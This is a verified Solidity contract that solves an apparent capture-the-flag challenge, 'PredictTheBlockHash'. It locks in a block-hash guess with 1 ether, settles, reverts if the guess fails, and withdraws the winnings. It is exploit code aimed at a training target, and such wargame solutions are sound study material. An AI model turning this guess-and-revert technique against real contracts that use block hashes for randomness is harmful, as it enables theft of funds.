/**
 *Submitted for verification at Etherscan.io on 2022-04-30
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

interface IPredictTheBlockHashChallenge {
    function lockInGuess(bytes32 hash) external payable;
    function settle() external;
    function isComplete() external view returns(bool);
}

contract PredictTheBlockHashSolver {
    IPredictTheBlockHashChallenge public challenge;
    address payable public owner;
    
    event Received(address, uint);
    event challengeSolved(uint256 balance);

    constructor() {
        owner = payable(msg.sender);
    }

    function proxy(address challengeAddress) public {
        require(msg.sender == owner, "Only the owner can set challenge address");
        challenge = IPredictTheBlockHashChallenge(challengeAddress);
    }


    function predict(bytes32 hash) public payable {
        require(msg.sender == owner, "Only the owner can predict the block hash");
        require(msg.value == 1 ether, "You must send 1 ether to predict the block hash");
        
        challenge.lockInGuess{value: msg.value}(hash);
    }

    function solve() public payable {
        require(msg.sender == owner, "Only the owner can solve this challenge");
        
        challenge.settle();

        require(challenge.isComplete(), "Guess failed, please try again"); // if not complete, revert the transaction, any change of the challenge contract will rollback
        payable(msg.sender).transfer(address(this).balance);
        emit challengeSolved(address(this).balance);
    }

    function destroy() public {
        require(msg.sender == owner, "Only the owner can destroy this contract");
		selfdestruct(payable(msg.sender)); 
	}

    receive() external payable {
        emit Received(msg.sender, msg.value);
    }

}